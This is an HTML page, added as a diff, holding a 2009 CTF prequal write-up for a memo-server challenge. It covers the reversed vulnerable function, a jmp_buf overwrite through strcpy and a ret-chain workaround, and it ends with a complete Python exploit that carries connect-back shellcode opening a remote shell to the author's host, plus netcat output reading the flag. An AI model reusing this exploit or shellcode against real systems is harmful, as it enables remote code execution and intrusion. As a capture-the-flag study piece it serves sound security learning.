@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html>
+    <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width initial-scale=1">
+
+  <title>ISEC 2009 CTF Prequal &#8211; Challenge 12</title>
+  <meta name="description" content="|  This is the write up for ISEC 2009 CTF Prequal challenge 12 as promised. Have fun.">
+  <link rel="stylesheet" href="/assets/bootstrap.css">
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="canonical" href="http://localhost:8000/ctf%20-%20clgt%20crew/2009/08/26/isec-2009-ctf-prequal-challenge-12.html">
+  <link rel="alternate" type="application/atom+xml" title="VNSecurity" href="http://localhost:8000/feed.xml" />
+  <script type="text/javascript" src='//ajax.googleapis.com/ajax/libs/webfont/1.4.7/webfont.js?ver=3.9.2'></script>
+  <script type="text/javascript" src="/assets/jquery.js"></script>
+  <script type="text/javascript" src="/assets/jquery.caroufredsel-6.0.4-packed.js"></script>
+  <script type="text/javascript">
+    // WebFont.load({
+    //     google: {
+    //         families: ['Source+Sans+Pro','Open+Sans::latin,vietnamese']
+    //     }
+    // });
+  </script>
+</head>
+
+    <body>
+        <div class="wrapper kopa-shadow">
+            <div class="row-fluid">
+                <header id="page-header">
+    <div class="clearfix" id="header-top">
+
+        <div class="kp-headline-wrapper clearfix">
+            <h6 class="kp-headline-title">Breaking news<span></span></h6>
+            <div class="kp-headline clearfix">
+                <dl class="ticker-1 clearfix">
+                    
+                    <dd>
+                        <a href="/headlines/2014/05/06/btalk-part-1.html">Phân tích ứng dụng Btalk trên Android &#8211; Phần một: Cơ chế xác thực người dùng</a>
+                    </dd>
+                    
+                    <dd>
+                        <a href="/headlines/2011/12/20/hoc-vien-sans-den-viet-nam.html">Học viện SANS đến Việt Nam 03/2012</a>
+                    </dd>
+                    
+                    <dd>
+                        <a href="/headlines/2011/12/16/hoi-thao-tet-2012.html">Hội thảo Tết 2012</a>
+                    </dd>
+                    
+                </dl><!--ticker-1-->
+            </div><!--kp-headline-->
+        </div><!--kp-headline-wrapper-->
+
+        <div class="social-search-box">
+
+        </div>
+        <!--social-search-box-->
+
+    </div>
+    <!--header-top-->
+
+    <div class="clearfix" id="header-middle">
+        <div id="logo-image">
+            <a href="http://vnsec-new.cloudapp.net/wp">
+                <img width="217" height="70" alt="VNSecurity Logo" src="/assets/logo.png">
+            </a>
+        </div>
+        <div class="top-banner">
+
+
+        </div>
+        <!--top-banner-->
+
+    </div>
+
+    <!--header-middle-->
+
+    <div id="header-bottom">
+        <nav id="main-nav">
+            <ul class="menu clearfix sf-js-enabled sf-arrows" id="main-menu">
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    <a href="/">Home</a>
+                </li>
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                |
+                </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/headlines/">headlines</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/tutorials/">tutorials</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/research/">research</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/ctf-clgt-crew/">ctf - clgt crew</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/misc/">misc</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    <a href="/papers.html">Papers</a>
+                </li>
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                |
+                </li>                
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    <a href="/tools.html">Tools</a>
+                </li>
+            </ul>
+        </nav>
+        <!--main-nav-->
+    </div>
+    <div>
+        
+    </div>
+    <!--header-bottom-->
+</header>
+                <div id="main-content">
+                    <div class="post type-post status-publish format-standard hentry category-tin-tuc tag-android tag-btalk tag-mobile entry-box clearfix">
+
+  <header class="post-header">
+    <h4 class="entry-title">ISEC 2009 CTF Prequal &#8211; Challenge 12</h4>
+    <p class="post-meta">Aug 26, 2009 • rd</p>
+  </header>
+
+  <article class="post-content">
+    <h2 id="summary">Summary</h2>
+
+<p>The provided <a href="/vnsec/Members/rd/Files/misc/isec.bin"><em>isec</em></a> binary is a memo server listening on port 8909. It has a remote buffer overflow bug in add memo function in which we can overwrite jmp_buf exception environment stored by setjmp(). Once *longjmp() *is called later in the program, we can control the EIP to execute our own code.</p>
+
+<h3 id="vulnerability">Vulnerability</h3>
+
+<p>The bug is inside the function which is responsible for add memo command at <strong>0x08048CE0</strong>. Below is reverse C code of this function:</p>
+
+<pre class="brush: cpp; gutter: true; highlight: [0,29,37,38]; title: ; notranslate" title="">char memo_array[30][30];
+char memoflag_array[30];
+int lastmemo;
+char buf4[4];
+
+int add_memo(int fd)
+{
+    char buf128[128];
+    int i;
+    int idx;
+
+    idx = lastmemo;
+    memset(buf128, 0, 128);
+    for ( i = 0; i &lt;= 14; ++i )
+    {
+        if ( i == 15 )
+        {
+            memcpy(buf128, "[!] Buffer Full!!n", 19);
+
+            return send(fd, buf128, strlen(buf128), 0);
+        }
+        if ( !memoflag_array[i] )
+        {
+            idx = i;
+            break;
+        }
+    }
+    memoflag_array[idx] = 1;
+    if ( !setjmp(exception_env) )
+    {
+        memcpy(buf128, "n[ Add Memo ]n", 15);
+        send(fd, buf128, strlen(buf128), 0);
+        memcpy(buf128, "Enter Message : ", 17);
+        send(fd, buf128, strlen(buf128), 0);
+        memset(buf128, 0, 128);
+        recv(fd, buf128, 28, 0);
+        strcpy(buf4, buf128);
+        longjmp(exception_env, 1);
+    }
+
+    if ( strlen(buf128) &lt;= 18 )
+    {
+        memset(memo_array[idx], 0, 30);
+        sprintf(memo_array[idx], "Memo : %s, size : %d", buf128, strlen(buf128));
+        memcpy(buf128, "nSaved Memo!!nn", 16);
+        send(fd, buf128, strlen(buf128), 0);
+        result = lastmemo;
+        if ( idx &gt;= lastmemo )
+        {
+             lastmemo = idx + 1;
+             return lastmemo;
+        }
+    }
+    else
+    {
+        memset(buf128, 0, 128u);
+        memcpy(buf128, "size too big!!n", 16);
+        send(fd, buf128, 128, 0);
+    }
+}
+</pre>
+
+<p>It is easy to see a buffer overflow bug at line 37<em>** **strcpy(buf4, buf128)</em>. If the input is long enough (more than 24 bytes), we will be able to overwrite the <em>jmp_buf exception_env</em> (see below) which is being used to save exception stack by <em>setjmp()</em> at line 29. By overwriting the IP saved on this <em>jmp_buf</em> and pointing it back to our shellcode, once <em>longjmp()</em> is called later at line 38, our shellcode will be executed.</p>
+
+<pre class="brush: plain; gutter: false; title: ; notranslate" title="">.bss:0804AD48 ; char buf[4]
+.bss:0804AD48 buf4            db 4 dup(?)             ; DATA XREF: add_memo+312
+.bss:0804AD4C                 public environ
+.bss:0804AD4C environ         dd 5 dup(?)             ; DATA XREF: start+16
+.bss:0804AD60 ; struct __jmp_buf_tag exception_env
+.bss:0804AD60 exception_env   dd ?                    ; DATA XREF: add_memo+BD
+.bss:0804AD60                                         ; 24 bytes away from buf4</pre>
+
+<h3 id="exploit">Exploit</h3>
+
+<p>It’s quite straight forward to exploit this bug. The only problem is that we need to find a good location to store our connect back shellcode as the server only get 28 bytes into buf128 from client. We could do this by splitting the shellcode into many small chunks across different memo records (each memo size is 30 bytes including some predefined texts so we have about 17 bytes for each shellcode chunk in each memo).</p>
+
+<p>I was able to come up with a working exploit in about half an hour after started working on this challenge. Unfortunately, since there was no preparation for this CTF game, the only freesbsd shell I can get access to was a free shell on geekshell.org. It’s a 64 bits FreeBSD box (amd64), `<em>gcc -m32</em>` did not work and some weird behaviors happened due to 32-bit compatibility mode. It was kinda a pain. I spent couple of hours after finishing the exploit just to figure out why my exploit didn’t work, how weird behaviors happened, non-executable data/BSS and how to bypass it and so on.. instead of working on the challenge.</p>
+
+<p>As the BSS segment was non-executable in this box, I searched around the binary and eventually found out a way to do multiple ret-into-code/libc chains (such as calling another recv() for the next stage) by pointing the EIP to 0×08049454.</p>
+
+<pre class="brush: plain; gutter: false; title: ; notranslate" title="">.text:08049454                 add     esp, 24h
+.text:08049457                 pop     ebx
+.text:08049458                 pop     ebp
+.text:08049459                 retn
+</pre>
+
+<p>This code allows me to have ESP pointing back into the beginning part of controllable buf128 on stack for the ret/..ret/.. chaining.</p>
+
+<p>Fortunately, while I was doing this, a friend went online and gave me the ssh access to his FreeBSD 32 bit box. So I stopped doing it and tried my previous exploit on this 32bits box. It worked without any problem after a few small tweaks.</p>
+
+<pre class="brush: plain; gutter: false; title: ; notranslate" title="">xxx@spark.ofloo.net&gt; nc -l 4445
+id
+uid=1006(memo) gid=1006(memo) groups=1006(memo)
+cat key
+WOWHACKER_WOWCODE&amp;OVERHEAD!?
+</pre>
+
+<h3 id="exploit-code">Exploit code</h3>
+
+<pre class="brush: python; gutter: true; title: ; notranslate" title="">#!/usr/bin/env python
+
+import socket
+
+class memo:
+	def  __init__(self, host, port):
+		self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		self.s.connect((host, port))
+		ret = self.s.recv(1024)
+		print ret
+
+	def addmemo(self, memo):
+		cmd = "1n"
+		self.s.send(cmd)
+		ret = self.s.recv(1024)
+		print ret
+		ret = self.s.recv(1024)
+		print ret
+		print repr(memo) + "n"
+		self.s.send(memo)
+		ret = self.s.recv(1024)
+		print ret
+		ret = self.s.recv(1024)
+		print ret
+
+	def close(self):
+		self.s.close()
+
+host = "221.143.48.88"
+port = 8909
+
+c = memo(host, port)
+a = raw_input("Enter to continue");
+
+# metasploit connect back shellcode with few modifications (jmp)
+# spark.ofloo.net:4445
+sc = "x68xd4x47x13x66x68xffx02x11x5dx89xe7x31xc0x50x6ax01" 
+     "x6ax02x6ax10xb0x61xcdx80x57x50x50x6ax62x58xcdx80x50" 
+     "x6ax5ax58xcdx80xffx4fxe8x79xe6x68x2fx2fx73x68x68x2f" 
+     "x62x69x6ex89xe3x50x54x53x50xb0x3bxcdx80"
+
+SPLITS = [15, 28, 42, 56, 65]
+JMPFWD = "xEBx0D"
+prev = 0
+for next in SPLITS:
+	tmp = sc[prev:next]
+	tmp = tmp.rjust(15,'x90') + JMPFWD
+	c.addmemo(tmp)
+	prev = next
+
+# jmpbuf overflow [24 bytes] [EIP]
+# 1st memo starts at memo_array+7 = 0x804a9c7
+s = "A"*24 + "xc7xa9x04x08"
+c.addmemo(s)
+
+c.close()
+</pre>
+
+
+  </article>
+
+</div>
+
+<hr/>
+<h2>Comments</h2>
+<div class="fb-comments" data-href="http://localhost:8000/ctf%20-%20clgt%20crew/2009/08/26/isec-2009-ctf-prequal-challenge-12.html" data-num-posts="4" data-width="706"></div>
+
+                </div>
+                <script type="text/javascript">
+jQuery(function() {
+    var _scroll = {
+        delay: 1000,
+        easing: 'linear',
+        items: 1,
+        duration: 0.07,
+        timeoutDuration: 0,
+        pauseOnHover: 'immediate'
+    };
+    jQuery('.ticker-1').carouFredSel({
+        width: 1000,
+        align: false,
+        items: {
+            width: 'variable',
+            height: 40,
+            visible: 1
+        },
+        scroll: _scroll
+    });
+
+    //  set carousels to be 100% wide
+    jQuery('.caroufredsel_wrapper').css('width', '100%');
+});
+</script>
+<script>
+  (function() {
+    var cx = '003844801333820630405:hlapfwpe2eq';
+    var gcse = document.createElement('script');
+    gcse.type = 'text/javascript';
+    gcse.async = true;
+    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
+        '//www.google.com/cse/cse.js?cx=' + cx;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(gcse, s);
+  })();
+</script>
+<gcse:search></gcse:search>
+<footer class="site-footer">
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      
+    </div>
+
+  </div>
+
+</footer>
+
+            </div>
+        </div>
+        <script>(function(d, s, id) {
+          var js, fjs = d.getElementsByTagName(s)[0];
+          if (d.getElementById(id)) return;
+          js = d.createElement(s); js.id = id;
+          js.src = "//connect.facebook.net/en_GB/all.js#xfbml=1&appId=671572696275219";
+          fjs.parentNode.insertBefore(js, fjs);
+        }(document, "script", "facebook-jssdk"));</script>
+    </body>
+</html>
